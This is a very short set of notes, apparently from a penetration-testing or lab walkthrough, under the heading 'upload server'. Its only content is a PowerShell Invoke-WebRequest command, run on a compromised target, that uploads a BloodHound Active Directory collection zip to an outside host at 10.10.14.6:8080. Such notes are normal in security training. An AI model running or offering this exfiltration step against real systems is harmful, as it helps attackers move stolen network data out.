

# upload server:

*From Target Machine*
```powershell
Invoke-WebRequest -Uri http://10.10.14.6:8080/20241124101422_BloodHound.zip -Method PUT -InFile 20241124101422_BloodHound.zip
```
